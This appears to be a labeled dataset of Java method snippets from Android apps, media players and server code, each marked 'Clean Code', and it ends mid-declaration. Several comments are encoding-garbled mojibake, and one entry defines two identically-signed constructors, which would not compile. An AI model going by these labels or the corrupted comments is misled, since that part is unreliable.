  Pattern pattern=Pattern.compile(searchStr,patternOptions);
  Matcher matcher=pattern.matcher(plainText.getText());
  String rawText=plainText.getText();
  if (!matcher.find()) {
    return sourceFile;
  }
  matcher.reset();
  List<PlainText.Snippet> snippets=new ArrayList<>();
  int previousEnd=0;
  while (matcher.find()) {
    int matchStart=matcher.start();
    snippets.add(snippet(rawText.substring(previousEnd,matchStart)));
    snippets.add(SearchResult.found(snippet(rawText.substring(matchStart,matcher.end()))));
    previousEnd=matcher.end();
  }
  snippets.add(snippet(rawText.substring(previousEnd)));
  return plainText.withText("""").withSnippets(snippets);
}",0,Clean Code
"/** 
 * Reads up to  {@code length} bytes of data and stores them into {@code buffer}, starting at index  {@code offset}. <p> This method blocks until at least one byte of data can be read, the end of the opened range is detected, or an exception is thrown.
 * @param buffer The buffer into which the read data should be stored.
 * @param offset The start offset into {@code buffer} at which data should be written.
 * @param readLength The maximum number of bytes to read.
 * @return The number of bytes read, or {@link C#RESULT_END_OF_INPUT} if the end of the openedrange is reached.
 * @throws IOException If an error occurs reading from the source.
 */
private int readInternal(byte[] buffer,int offset,int readLength) throws IOException {
  if (readLength == 0) {
    return 0;
  }
  if (bytesToRead != C.LENGTH_UNSET) {
    long bytesRemaining=bytesToRead - bytesRead;
    if (bytesRemaining == 0) {
      return C.RESULT_END_OF_INPUT;
    }
    readLength=(int)Math.min(readLength,bytesRemaining);
  }
  int read=inputStream.read(buffer,offset,readLength);
  if (read == -1) {
    if (bytesToRead != C.LENGTH_UNSET) {
      throw new EOFException();
    }
    return C.RESULT_END_OF_INPUT;
  }
  bytesRead+=read;
  bytesTransferred(read);
  return read;
}",0,Clean Code
"public void setType(int type){
  currentType=type;
  if (type == TYPE_PHONE) {
    final TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(UserConfig.getInstance(currentAccount).clientUserId);
    textView.setText(LocaleController.formatString(""CheckPhoneNumber"",R.string.CheckPhoneNumber,PhoneFormat.getInstance().format(""+"" + user.phone)));
    String text=LocaleController.getString(""CheckPhoneNumberInfo"",R.string.CheckPhoneNumberInfo);
    SpannableStringBuilder builder=new SpannableStringBuilder(text);
    int index1=text.indexOf(""**"");
    int index2=text.lastIndexOf(""**"");
    if (index1 >= 0 && index2 >= 0 && index1 != index2) {
      builder.replace(index2,index2 + 2,"""");
      builder.replace(index1,index1 + 2,"""");
      try {
        builder.setSpan(new URLSpanNoUnderline(LocaleController.getString(""CheckPhoneNumberLearnMoreUrl"",R.string.CheckPhoneNumberLearnMoreUrl)),index1,index2 - 2,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
    detailTextView.setText(builder);
    yesButton.setText(LocaleController.getString(""CheckPhoneNumberYes"",R.string.CheckPhoneNumberYes));
    noButton.setText(LocaleController.getString(""CheckPhoneNumberNo"",R.string.CheckPhoneNumberNo));
  }
 else   if (type == TYPE_PASSWORD) {
    textView.setText(LocaleController.getString(""YourPasswordHeader"",R.string.YourPasswordHeader));
    detailTextView.setText(LocaleController.getString(""YourPasswordRemember"",R.string.YourPasswordRemember));
    yesButton.setText(LocaleController.getString(""YourPasswordRememberYes"",R.string.YourPasswordRememberYes));
    noButton.setText(LocaleController.getString(""YourPasswordRememberNo"",R.string.YourPasswordRememberNo));
  }
}",0,Clean Code
"/** 
 * PIP mode fix
 */
private void showHideWidgets(boolean show){
  Activity activity=getActivity();
  if (activity != null) {
    View overlay=activity.findViewById(R.id.player_overlay_wrapper);
    if (overlay != null) {
      overlay.setVisibility(show ? View.VISIBLE : View.GONE);
    }
    View liveChat=activity.findViewById(R.id.live_chat_wrapper);
    if (liveChat != null) {
      liveChat.setVisibility(show ? View.VISIBLE : View.GONE);
    }
  }
}
",0,Clean Code
"/** 
 * 杞爜
 * @param binaryData 鏈浆鐮佹暟鎹�
 * @return 杞爜鍚庢暟鎹覆
 */
public static String encode(byte[] binaryData){
  if (binaryData == null) {
    return null;
  }
  int lengthDataBits=binaryData.length * EIGHT_BIT;
  if (lengthDataBits == 0) {
    return """";
  }
  int fewerThan24bits=lengthDataBits % TWENTY_FOUR_BIT_GROUP;
  int numberTriplets=lengthDataBits / TWENTY_FOUR_BIT_GROUP;
  int numberQuartet=fewerThan24bits != 0 ? numberTriplets + 1 : numberTriplets;
  char[] encodedData;
  encodedData=new char[numberQuartet * 4];
  byte k, l, b1, b2, b3;
  int encodedIndex=0;
  int dataIndex=0;
  for (int i=0; i < numberTriplets; i++) {
    b1=binaryData[dataIndex++];
    b2=binaryData[dataIndex++];
    b3=binaryData[dataIndex++];
    k=(byte)(b1 & 0x03);
    l=(byte)(b2 & 0x0f);
    byte val1=((b1 & SIGN) == 0) ? (byte)(b1 >> 2) : (byte)((b1) >> 2 ^ 0xc0);
    byte val2=((b2 & SIGN) == 0) ? (byte)(b2 >> 4) : (byte)((b2) >> 4 ^ 0xf0);
    byte val3=((b3 & SIGN) == 0) ? (byte)(b3 >> 6) : (byte)((b3) >> 6 ^ 0xfc);
    encodedData[encodedIndex++]=lookUpBase64Alphabet[val1];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[val2 | (k << 4)];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[(l << 2) | val3];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[b3 & 0x3f];
  }
  if (fewerThan24bits == EIGHT_BIT) {
    b1=binaryData[dataIndex];
    k=(byte)(b1 & 0x03);
    byte val1=((b1 & SIGN) == 0) ? (byte)(b1 >> 2) : (byte)((b1) >> 2 ^ 0xc0);
    encodedData[encodedIndex++]=lookUpBase64Alphabet[val1];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[k << 4];
    encodedData[encodedIndex++]=PAD;
    encodedData[encodedIndex++]=PAD;
  }
 else   if (fewerThan24bits == SIXTEEN_BIT) {
    b1=binaryData[dataIndex];
    b2=binaryData[dataIndex + 1];
    l=(byte)(b2 & 0x0f);
    k=(byte)(b1 & 0x03);
    byte val1=((b1 & SIGN) == 0) ? (byte)(b1 >> 2) : (byte)((b1) >> 2 ^ 0xc0);
    byte val2=((b2 & SIGN) == 0) ? (byte)(b2 >> 4) : (byte)((b2) >> 4 ^ 0xf0);
    encodedData[encodedIndex++]=lookUpBase64Alphabet[val1];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[val2 | (k << 4)];
    encodedData[encodedIndex++]=lookUpBase64Alphabet[l << 2];
    encodedData[encodedIndex++]=PAD;
  }
  return new String(encodedData);
}",0,Clean Code
"private static boolean isPositionVisible(final View view,final float positionX,final float positionY){
  final float[] position=new float[]{positionX,positionY};
  View currentView=view;
  while (currentView != null) {
    if (currentView != view) {
      position[0]-=currentView.getScrollX();
      position[1]-=currentView.getScrollY();
    }
    if (position[0] < 0 || position[1] < 0 || position[0] > currentView.getWidth() || position[1] > currentView.getHeight()) {
      return false;
    }
    if (!currentView.getMatrix().isIdentity()) {
      currentView.getMatrix().mapPoints(position);
    }
    position[0]+=currentView.getLeft();
    position[1]+=currentView.getTop();
    final ViewParent parent=currentView.getParent();
    if (parent instanceof View) {
      currentView=(View)parent;
    }
 else {
      currentView=null;
    }
  }
  return true;
}",0,Clean Code
"private void appendNextSectionVideoIfNeeded(Video video){
  mNextVideo=null;
  if (!isSectionPlaylistEnabled(video)) {
    return;
  }
  VideoGroup group=video.getGroup();
  if (group == null || group.isEmpty()) {
    return;
  }
  List<Video> videos=group.getVideos();
  boolean found=false;
  for (  Video current : videos) {
    if (found && current.hasVideo() && !current.isUpcoming) {
      mNextRetryCount=0;
      mNextVideo=current;
      return;
    }
    if (current.equals(video)) {
      found=true;
    }
  }
  if (mNextRetryCount > 0) {
    mNextRetryCount=0;
  }
 else {
    continueGroup(group,continuation -> appendNextSectionVideoIfNeeded(video),getPlayer().isSuggestionsShown());
    mNextRetryCount++;
  }
}",0,Clean Code
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  ChatThemeController.preloadAllWallpaperThumbs(true);
  ChatThemeController.preloadAllWallpaperThumbs(false);
  ChatThemeController.preloadAllWallpaperImages(true);
  ChatThemeController.preloadAllWallpaperImages(false);
  NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.emojiLoaded);
  isApplyClicked=false;
  List<EmojiThemes> cachedThemes=themeDelegate.getCachedThemes();
  if (cachedThemes == null || cachedThemes.isEmpty()) {
    ChatThemeController.requestAllChatThemes(new ResultCallback<List<EmojiThemes>>(){
      @Override public void onComplete(      List<EmojiThemes> result){
        if (result != null && !result.isEmpty()) {
          themeDelegate.setCachedThemes(result);
        }
        onDataLoaded(result);
      }
      @Override public void onError(      TLRPC.TL_error error){
        Toast.makeText(getContext(),error.text,Toast.LENGTH_SHORT).show();
      }
    }
,true);
  }
 else {
    onDataLoaded(cachedThemes);
  }
  if (chatActivity.getCurrentUser() != null && SharedConfig.dayNightThemeSwitchHintCount > 0 && !chatActivity.getCurrentUser().self) {
    SharedConfig.updateDayNightThemeSwitchHintCount(SharedConfig.dayNightThemeSwitchHintCount - 1);
    hintView=new HintView(getContext(),9,chatActivity.getResourceProvider());
    hintView.setVisibility(View.INVISIBLE);
    hintView.setShowingDuration(5000);
    hintView.setBottomOffset(-AndroidUtilities.dp(8));
    hintView.setText(AndroidUtilities.replaceTags(LocaleController.formatString(""ChatThemeDayNightSwitchTooltip"",R.string.ChatThemeDayNightSwitchTooltip,chatActivity.getCurrentUser().first_name)));
    AndroidUtilities.runOnUIThread(() -> {
      hintView.showForView(darkThemeView,true);
    }
,1500);
    container.addView(hintView,LayoutHelper.createFrame(LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT,Gravity.LEFT | Gravity.TOP,10,0,10,0));
  }
}",0,Clean Code
"/** 
 * Sets custom layout resource for incoming text message.
 * @param layout layout resource.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setIncomingTextLayout(@LayoutRes int layout){
  this.incomingTextConfig.layout=layout;
  return this;
}
/** 
 * Sets custom layout resource for incoming text message.
 * @param layout  layout resource.
 * @param payload custom data.
 * @return {@link MessageHolders} for subsequent configuration.
 */
public MessageHolders setIncomingTextLayout(@LayoutRes int layout,Object payload){
  this.incomingTextConfig.layout=layout;
  this.incomingTextConfig.payload=payload;
  return this;
}
",0,Clean Code
"/** 
 * Returns  {@link FakeRendererCapabilities} that advertises adaptive support for alltracks of the given type.
 * @param trackType the track type of all formats that this renderer capabilities advertisessupport for.
 */
FakeRendererCapabilities(int trackType){
  this(trackType,FORMAT_HANDLED | ADAPTIVE_SEAMLESS);
}
/** 
 * Returns  {@link FakeRendererCapabilities} that advertises support level using given valuefor all tracks of the given type.
 * @param trackType the track type of all formats that this renderer capabilities advertisessupport for.
 * @param supportValue the support level value that will be returned for formats withthe given type.
 */
FakeRendererCapabilities(int trackType,int supportValue){
  this.trackType=trackType;
  this.supportValue=supportValue;
}
public FakeRendererCapabilities(int trackType){
  this.trackType=trackType;
}
",0,Clean Code
"/** 
 * Returns true if the intent is a valid launch intent for a launcher activity of an app. This is used to identify shortcuts which are different from the ones exposed by the applications' manifest file.
 * @param launchIntent The intent that will be launched when the shortcut is clicked.
 */
public static boolean isLauncherAppTarget(Intent launchIntent){
  if (launchIntent != null && Intent.ACTION_MAIN.equals(launchIntent.getAction()) && launchIntent.getComponent() != null && launchIntent.getCategories() != null && launchIntent.getCategories().size() == 1 && launchIntent.hasCategory(Intent.CATEGORY_LAUNCHER) && TextUtils.isEmpty(launchIntent.getDataString())) {
    Bundle extras=launchIntent.getExtras();
    return extras == null || extras.keySet().isEmpty();
  }
  return false;
}",0,Clean Code
"/** 
 * Creates an  {@link ExoPlayer} instance.
 * @param context A {@link Context}.
 * @param renderers The {@link Renderer}s that will be used by the instance.
 * @param trackSelector The {@link TrackSelector} that will be used by the instance.
 */
public static ExoPlayer newInstance(Context context,Renderer[] renderers,TrackSelector trackSelector){
  return newInstance(context,renderers,trackSelector,new DefaultLoadControl());
}
/** 
 * Creates an  {@link ExoPlayer} instance.
 * @param context A {@link Context}.
 * @param renderers The {@link Renderer}s that will be used by the instance.
 * @param trackSelector The {@link TrackSelector} that will be used by the instance.
 * @param loadControl The {@link LoadControl} that will be used by the instance.
 */
public static ExoPlayer newInstance(Context context,Renderer[] renderers,TrackSelector trackSelector,LoadControl loadControl){
  return newInstance(context,renderers,trackSelector,loadControl,Util.getLooper());
}
/** 
 * Creates an  {@link ExoPlayer} instance.
 * @param context A {@link Context}.
 * @param renderers The {@link Renderer}s that will be used by the instance.
 * @param trackSelector The {@link TrackSelector} that will be used by the instance.
 * @param loadControl The {@link LoadControl} that will be used by the instance.
 * @param looper The {@link Looper} which must be used for all calls to the player and which isused to call listeners on.
 */
public static ExoPlayer newInstance(Context context,Renderer[] renderers,TrackSelector trackSelector,LoadControl loadControl,Looper looper){
  return newInstance(context,renderers,trackSelector,loadControl,getDefaultBandwidthMeter(context),looper);
}
/** 
 * Creates an  {@link ExoPlayer} instance.
 * @param context A {@link Context}.
 * @param renderers The {@link Renderer}s that will be used by the instance.
 * @param trackSelector The {@link TrackSelector} that will be used by the instance.
 * @param loadControl The {@link LoadControl} that will be used by the instance.
 * @param bandwidthMeter The {@link BandwidthMeter} that will be used by the instance.
 * @param looper The {@link Looper} which must be used for all calls to the player and which isused to call listeners on.
 */
@SuppressWarnings(""unused"") public static ExoPlayer newInstance(Context context,Renderer[] renderers,TrackSelector trackSelector,LoadControl loadControl,BandwidthMeter bandwidthMeter,Looper looper){
  return new ExoPlayerImpl(renderers,trackSelector,loadControl,bandwidthMeter,Clock.DEFAULT,looper);
}
",0,Clean Code
"public void apply(Activity activity,FormatItem format){
  apply(activity,format,false);
}
public void apply(Activity activity,FormatItem format,boolean force){
  setContext(activity);
  if (activity == null) {
    Log.e(TAG,""Activity in null. exiting..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (format == null) {
    Log.e(TAG,""Can't apply mode change: format is null"");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (!isSupported()) {
    Log.e(TAG,""Autoframerate not supported. Exiting..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
  if (System.currentTimeMillis() - mPrevCall < THROTTLE_INTERVAL_MS) {
    Log.e(TAG,""Throttling afr calls..."");
    if (mListener != null) {
      mListener.onModeCancel();
    }
    return;
  }
 else {
    mPrevCall=System.currentTimeMillis();
  }
  int width=format.getWidth();
  float frameRate=correctFrameRate(format.getFrameRate());
  Pair<Integer,Float> currentFormat=new Pair<>(width,frameRate);
  Log.d(TAG,String.format(""Applying mode change... Video fps: %s, width: %s, height: %s"",frameRate,width,format.getHeight()));
  syncMode(activity,width,frameRate,force);
}
",0,Clean Code
"@Override public int batchAddMenu(UserDO loginUser,AppMenuVO appMenus) throws ApplicationException {
  List<MenuDO> menuDos=new ArrayList<MenuDO>();
  if (null == appMenus || null == appMenus.getMenus() || appMenus.getMenus().size() == 0) {
    return 0;
  }
  for (  MenuVO menuVo : appMenus.getMenus()) {
    MenuDO menuDo=new MenuDO();
    menuDo.setAppId(appMenus.getAppId());
    menuDo.setMenuUrl(menuVo.getSref());
    menuDo.setMenuTitle(menuVo.getName());
    menuDo.setMenuName(menuVo.getName());
    menuDo.setMenuCode(UUID.randomUUID().toString());
    menuDo.setIsEnable(1);
    menuDo.setIcon(menuVo.getIcon());
    menuDo.setHeaderTitleSet(menuVo.getHeaderTitleSet());
    if (null != menuVo.getChildren() && menuVo.getChildren().size() > 0) {
      menuDo.setIsLeaf(0);
      menuDos.add(menuDo);
      addChildren(menuDos,menuDo,menuVo.getChildren());
    }
 else {
      menuDo.setIsLeaf(1);
      menuDos.add(menuDo);
    }
  }
  return teslaMenuService.batchInsert(menuDos);
}",0,Clean Code
"public boolean scrollToPosition(int page){
  if (page == currentPosition || (manualScrolling != null && nextPosition == page)) {
    return false;
  }
  if (manualScrolling != null) {
    manualScrolling.cancel();
    manualScrolling=null;
  }
  boolean forward=currentPosition < page;
  animatingForward=forward;
  nextPosition=page;
  updateViewForIndex(1);
  onTabPageSelected(page);
  int trasnlationX=viewPages[0] != null ? viewPages[0].getMeasuredWidth() : 0;
  if (forward) {
    viewPages[1].setTranslationX(trasnlationX);
  }
 else {
    viewPages[1].setTranslationX(-trasnlationX);
  }
  manualScrolling=ValueAnimator.ofFloat(0,1);
  manualScrolling.addUpdateListener(anm -> {
    float progress=(float)anm.getAnimatedValue();
    if (viewPages[1] == null) {
      return;
    }
    if (animatingForward) {
      viewPages[1].setTranslationX(viewPages[0].getMeasuredWidth() * (1f - progress));
      viewPages[0].setTranslationX(-viewPages[0].getMeasuredWidth() * progress);
    }
 else {
      viewPages[1].setTranslationX(-viewPages[0].getMeasuredWidth() * (1f - progress));
      viewPages[0].setTranslationX(viewPages[0].getMeasuredWidth() * progress);
    }
    currentProgress=progress;
    onTabAnimationUpdate(true);
  }
);
  manualScrolling.addListener(new AnimatorListenerAdapter(){
    @Override public void onAnimationEnd(    Animator animation){
      if (viewPages[1] != null) {
        swapViews();
        viewsByType.put(viewTypes[1],viewPages[1]);
        removeView(viewPages[1]);
        viewPages[0].setTranslationX(0);
        viewPages[1]=null;
      }
      manualScrolling=null;
      onTabAnimationUpdate(true);
      onScrollEnd();
    }
  }
);
  manualScrolling.setDuration(540);
  manualScrolling.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  manualScrolling.start();
  return true;
}",0,Clean Code
"@Override public CharSequence apply(IN input,Schema<IN,?> schema){
  return apply(input,schema,0);
}
@Override public CharSequence apply(IN input,Schema<IN,?> schema,long rowId){
  Field<?,? extends CharSequence>[] fields=(Field<?,? extends CharSequence>[])schema.getFields();
  if (fields.length == 0) {
    return EMPTY_RESULT;
  }
  if (withBatchMode) {
    if (rowId == 0 || batchSize > 0 && rowId % batchSize == 0) {
      return SqlDialect.getFirstRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase);
    }
 else {
      return String.join(LINE_SEPARATOR,"","",SqlDialect.getOtherRow(dialect,() -> appendTableInfo(fields),() -> addValues(input,fields),keywordCase));
    }
  }
 else {
    return String.join("" "",INSERT_INTO.getValue(keywordCase),appendTableInfo(fields),VALUES.getValue(keywordCase),addValues(input,fields));
  }
}",0,Clean Code
"@Override public void onPause(){
  super.onPause();
  if (thread != null && !thread.isInterrupted() && thread.isAlive()) {
    thread.interrupt();
  }
}
",0,Clean Code
"public static Node right3(Node head){
  if (head == null || head.next == null || head.next.next == null) {
    return null;
  }
  Node cur=head;
  ArrayList<Node> arr=new ArrayList<>();
  while (cur != null) {
    arr.add(cur);
    cur=cur.next;
  }
  return arr.get((arr.size() - 3) / 2);
}",0,Clean Code
"private Result<Void> modifyRetentionTime(Long clusterPhyId,List<ReassignSubJobPO> subJobPOList,String operator){
  Map<String,Long> needModifyTopicRetentionTimeMap=new HashMap<>();
  for (  ReassignSubJobPO subJobPO : subJobPOList) {
    ReassignSubJobExtendData extendData=ConvertUtil.str2ObjByJson(subJobPO.getExtendData(),ReassignSubJobExtendData.class);
    if (extendData == null || extendData.getOriginalRetentionTimeUnitMs() == null || extendData.getReassignRetentionTimeUnitMs() == null || extendData.getOriginalRetentionTimeUnitMs().equals(extendData.getReassignRetentionTimeUnitMs())) {
      continue;
    }
    needModifyTopicRetentionTimeMap.put(subJobPO.getTopicName(),extendData.getReassignRetentionTimeUnitMs());
  }
  Result<Void> returnRV=Result.buildSuc();
  for (  Map.Entry<String,Long> entry : needModifyTopicRetentionTimeMap.entrySet()) {
    Map<String,String> changedProps=new HashMap<>();
    changedProps.put(TopicConfig0100.RETENTION_MS_CONFIG,String.valueOf(entry.getValue()));
    Result<Void> rv=topicConfigService.modifyTopicConfig(new KafkaTopicConfigParam(clusterPhyId,entry.getKey(),changedProps),operator);
    if (rv == null || rv.failed()) {
      returnRV=rv;
    }
  }
  return returnRV;
}",0,Clean Code
"/** 
 * @return The single result of the query as an Object.
 */
public Object executeScalar(){
  try (ResultSet rs=executeQuery()){
    if (!rs.next()) {
      return null;
    }
    return rs.getObject(1);
  }
 catch (  SQLException ex) {
    throw new NonTransientException(ex.getMessage(),ex);
  }
}
/** 
 * Execute the PreparedStatement and return a single 'primitive' value from the ResultSet.
 * @param returnType The type to return.
 * @param < V > The type parameter to return a List of.
 * @return A single result from the execution of the statement, as a type of {@literal returnType}.
 * @throws NonTransientException {@literal returnType} is unsupported, cannot be cast to fromthe result, or any SQL errors occur.
 */
public <V>V executeScalar(Class<V> returnType){
  try (ResultSet rs=executeQuery()){
    if (!rs.next()) {
      Object value=null;
      if (Integer.class == returnType) {
        value=0;
      }
 else       if (Long.class == returnType) {
        value=0L;
      }
 else       if (Boolean.class == returnType) {
        value=false;
      }
      return returnType.cast(value);
    }
 else {
      return getScalarFromResultSet(rs,returnType);
    }
  }
 catch (  SQLException ex) {
    throw new NonTransientException(ex.getMessage(),ex);
  }
}",0,Clean Code
"/** 
 * 纭鑰冩牳缁撴灉锛岃�冩牳瀹屾垚
 */
@SysLogHandler(isReturn=true) public Content confirmResult(String appraisalName,List<Integer> employeeAppraisalIds,boolean isLast){
  String content;
  if (isLast) {
    content=""纭鑰冩牳缁撴灉锛岃�冩牳瀹屾垚"";
  }
 else {
    content=""纭鑰冩牳缁撴灉"";
  }
  employeeAppraisalIds.forEach(employeeAppraisalId -> {
    save(content,employeeAppraisalId);
  }
);
  return new Content(appraisalName,content,BehaviorEnum.UPDATE);
}
",0,Clean Code
"private void chekDestroyDecoder(){
  if (loadFrameRunnable == null && destroyWhenDone && nativePtr != 0 && !generatingCache) {
    destroyDecoder(nativePtr);
    nativePtr=0;
  }
  if (!canLoadFrames()) {
    if (renderingBitmap != null) {
      renderingBitmap.recycle();
      renderingBitmap=null;
    }
    if (backgroundBitmap != null) {
      backgroundBitmap.recycle();
      backgroundBitmap=null;
    }
    if (decodeQueue != null) {
      decodeQueue.recycle();
      decodeQueue=null;
    }
    for (int i=0; i < unusedBitmaps.size(); i++) {
      unusedBitmaps.get(i).recycle();
    }
    unusedBitmaps.clear();
    invalidateInternal();
  }
}",0,Clean Code
"/** 
 * 灏嗘煇涓枃浠舵墦鍖呭埌鎸囧畾璺緞鐨� zip 鏂囦欢涓�
 * @param zipPath zip 鏂囦欢缁濆璺緞
 * @param file 鏂囦欢
 */
public static void zipFile(String zipPath,File file){
  ZipParameters parameters=new ZipParameters();
  parameters.setIncludeRootFolder(true);
  try {
    new ZipFile(zipPath).addFile(file,parameters);
  }
 catch (  ZipException e) {
    throw new AppException(AppErrorCode.IO_ERROR,String.format(""Zip %s failed"",zipPath),e);
  }
}
",0,Clean Code
"private void appendRemoveFromHistoryButton(){
  if (mVideo == null || mVideo.mediaItem == null || mVideo.mediaItem.getFeedbackToken() == null) {
    return;
  }
  if (!mVideo.belongsToHistory() || !mIsRemoveFromHistoryButtonEnabled) {
    return;
  }
  RxHelper.disposeActions(mNotInterestedAction);
  mDialogPresenter.appendSingleButton(UiOptionItem.from(getContext().getString(R.string.remove_from_history),optionItem -> {
    mNotInterestedAction=mMediaItemService.markAsNotInterestedObserve(mVideo.mediaItem.getFeedbackToken()).subscribe(var -> {
    }
,error -> Log.e(TAG,""Remove from history error: %s"",error.getMessage()),() -> {
      if (mCallback != null) {
        mCallback.onItemAction(mVideo,VideoMenuCallback.ACTION_REMOVE);
      }
 else {
        MessageHelpers.showMessage(getContext(),R.string.removed_from_history);
      }
      VideoStateService.instance(getContext()).removeByVideoId(mVideo.videoId);
    }
);
    mDialogPresenter.closeDialog();
  }
));
}
",0,Clean Code
"@Override public LazyTextFieldComp.Structure createBase(){
  var sp=new StackPane();
  var r=new TextField();
  r.setOnKeyPressed(ke -> {
    if (ke.getCode().equals(KeyCode.ESCAPE)) {
      currentValue.setValue(appliedValue.getValue());
    }
    if (ke.getCode().equals(KeyCode.ENTER) || ke.getCode().equals(KeyCode.ESCAPE)) {
      r.getScene().getRoot().requestFocus();
    }
    ke.consume();
  }
);
  r.focusedProperty().addListener((c,o,n) -> {
    if (!n) {
      appliedValue.setValue(currentValue.getValue());
    }
  }
);
  sp.focusedProperty().addListener((c,o,n) -> {
    if (n) {
      r.setDisable(false);
      r.requestFocus();
    }
  }
);
  PlatformThread.sync(appliedValue).addListener((observable,oldValue,n) -> {
    currentValue.setValue(n);
  }
);
  r.setPrefWidth(0);
  sp.getChildren().add(r);
  sp.prefWidthProperty().bind(r.prefWidthProperty());
  sp.prefHeightProperty().bind(r.prefHeightProperty());
  r.setDisable(true);
  currentValue.subscribe(n -> {
    PlatformThread.runLaterIfNeeded(() -> {
      if (Objects.equals(r.getText(),n) || (n == null && r.getText().isEmpty())) {
        return;
      }
      r.setText(n);
    }
);
  }
);
  r.textProperty().addListener((observable,oldValue,newValue) -> {
    currentValue.setValue(newValue);
  }
);
  r.focusedProperty().addListener((c,o,n) -> {
    if (!n) {
      r.setDisable(true);
    }
  }
);
  r.getStyleClass().add(""lazy-text-field-comp"");
  return new Structure(sp,r);
}",0,Clean Code
"@Override public void setValue(ProfileActivity object,float value){
  headerShadowAlpha=value;
  topView.invalidate();
}
@Override public void setValue(ActionBar object,float value){
  mediaHeaderAnimationProgress=value;
  topView.invalidate();
  int color1=getThemedColor(Theme.key_profile_title);
  int color2=getThemedColor(Theme.key_player_actionBarTitle);
  int c=AndroidUtilities.getOffsetColor(color1,color2,value,1.0f);
  nameTextView[1].setTextColor(c);
  if (lockIconDrawable != null) {
    lockIconDrawable.setColorFilter(c,PorterDuff.Mode.SRC_IN);
  }
  if (scamDrawable != null) {
    color1=getThemedColor(Theme.key_avatar_subtitleInProfileBlue);
    scamDrawable.setColor(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f));
  }
  color1=getThemedColor(Theme.key_actionBarDefaultIcon);
  color2=getThemedColor(Theme.key_actionBarActionModeDefaultIcon);
  actionBar.setItemsColor(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f),false);
  color1=getThemedColor(Theme.key_avatar_actionBarSelectorBlue);
  color2=getThemedColor(Theme.key_actionBarActionModeDefaultSelector);
  actionBar.setItemsBackgroundColor(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f),false);
  topView.invalidate();
  otherItem.setIconColor(getThemedColor(Theme.key_actionBarDefaultIcon));
  callItem.setIconColor(getThemedColor(Theme.key_actionBarDefaultIcon));
  videoCallItem.setIconColor(getThemedColor(Theme.key_actionBarDefaultIcon));
  editItem.setIconColor(getThemedColor(Theme.key_actionBarDefaultIcon));
  if (verifiedDrawable != null) {
    color1=getThemedColor(Theme.key_profile_verifiedBackground);
    color2=getThemedColor(Theme.key_player_actionBarTitle);
    verifiedDrawable.setColorFilter(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f),PorterDuff.Mode.SRC_IN);
  }
  if (verifiedCheckDrawable != null) {
    color1=getThemedColor(Theme.key_profile_verifiedCheck);
    color2=getThemedColor(Theme.key_windowBackgroundWhite);
    verifiedCheckDrawable.setColorFilter(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f),PorterDuff.Mode.SRC_IN);
  }
  if (premiumStarDrawable != null) {
    color1=getThemedColor(Theme.key_profile_verifiedBackground);
    color2=getThemedColor(Theme.key_player_actionBarTitle);
    premiumStarDrawable.setColorFilter(AndroidUtilities.getOffsetColor(color1,color2,value,1.0f),PorterDuff.Mode.MULTIPLY);
  }
  updateEmojiStatusDrawableColor();
  if (avatarsViewPagerIndicatorView.getSecondaryMenuItem() != null && (videoCallItemVisible || editItemVisible || callItemVisible)) {
    needLayoutText(Math.min(1f,extraHeight / AndroidUtilities.dp(88f)));
  }
}",0,Clean Code
"/** 
 * Process items to be displayed on the page. If you scroll to a new page, the playback of all items on the previous page needs to be stopped. Whether a playback page is required for the new page is determined based on whether video is enabled.
 * @param fromItem
 * @param toItem
 */
public void processVideoPlay(int fromItem,int toItem){
  if (mViewModel == null || fromItem < 0 || toItem >= mMemberEntityList.size()) {
    return;
  }
  List<String> newUserIds=new ArrayList<>();
  if (mVisibleVideoStreams == null) {
    mVisibleVideoStreams=new ArrayList<>();
  }
  for (int i=fromItem; i <= toItem; i++) {
    UserEntity entity=mMemberEntityList.get(i);
    startVideoPlay(entity);
    if (!entity.isSelf()) {
      newUserIds.add(entity.getUserId());
    }
  }
  for (  String userId : mVisibleVideoStreams) {
    if (!newUserIds.contains(userId) && !isUserTalkingViewPlaying(userId)) {
      mViewModel.stopPlayVideo(userId,false,false);
    }
  }
  mVisibleVideoStreams=newUserIds;
}",0,Clean Code
"/** 
 * 鏇存柊閰嶇疆;鏁版嵁搴撳師瀛愭搷浣滐紝鏈�灏弒ql鍔ㄤ綔锛屾棤涓氬姟灏佽
 * @param dataId  data Id
 * @param group   group
 * @param appName app name
 * @param time    time
 */
private void updateConfigSubAtomic(final String dataId,final String group,final String appName,final Timestamp time){
  final String appNameTmp=appName == null ? """" : appName;
  try {
    jt.update(""UPDATE app_configdata_relation_subs SET gmt_modified=? WHERE data_id=? AND group_id=? AND app_name=?"",time,dataId,group,appNameTmp);
  }
 catch (  CannotGetJdbcConnectionException e) {
    fatalLog.error(""[db-error] "" + e.toString(),e);
    throw e;
  }
}
",0,Clean Code
"/** 
 * private method 
 */
private boolean checkIfIgnore(ConsumerRecord<String,String> consumerRecord,String filterKey,String filterValue){
  if (filterKey != null && consumerRecord.key() == null) {
    return true;
  }
  if (filterKey != null && consumerRecord.key() != null && !consumerRecord.key().contains(filterKey)) {
    return true;
  }
  if (filterValue != null && consumerRecord.value() == null) {
    return true;
  }
  return (filterValue != null && consumerRecord.value() != null && !consumerRecord.value().contains(filterValue));
}
",0,Clean Code
"public ArrayList addOrHw(ArrayList mArray,Object oneArray,ArrayList<?> jsonToBean) throws Throwable {
